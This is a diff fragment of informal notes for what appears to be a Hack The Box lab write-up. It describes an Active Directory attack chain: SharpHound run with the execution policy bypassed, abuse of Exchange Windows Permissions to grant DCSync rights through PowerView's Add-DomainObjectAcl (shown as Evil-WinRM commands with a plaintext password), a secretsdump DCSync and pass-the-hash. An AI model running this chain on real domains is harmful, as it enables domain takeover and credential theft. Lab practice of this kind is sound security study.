@@ -131,3 +131,9 @@ powershell.exe -ExecutionPolicy Bypass -File SharpHound.ps1
 the reason we do this is because we want to bypass the security restrictions imposed on running our powershell script
 
 we do this and get the map... we check then we realise we have privs of adding a user to the domain and group exchange windows permissions... once we are here we have WriteACL(access control lists) privs so we can write the access controll lists privs to be DCSync rights... we perform a DCSync attack using impacket-secretsdump and boom we get the hash belonging to the admin.... the DCSync attack takes advantage of DRS replication process... Domain Replication Service is a service that is used by domain controllers to replicate the  domain information of domain controllers within a domain  after getting the hash we do a passthehash attack... this happens because since maybe the domain computers might have the cached hash of the password in their memory and when prompted it enables someone to authenticate without any issues
+
+
+*Evil-WinRM* PS C:\Windows\Temp\privesc> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Windows\Temp\privesc> $SecPassword = ConvertTo-SecureString '17isaya17isaya' -AsPlainText -Force
+*Evil-WinRM* PS C:\Windows\Temp\privesc> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\isaiah', $SecPassword)
+*Evil-WinRM* PS C:\Windows\Temp\privesc> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity isaiah -Rights DCSync
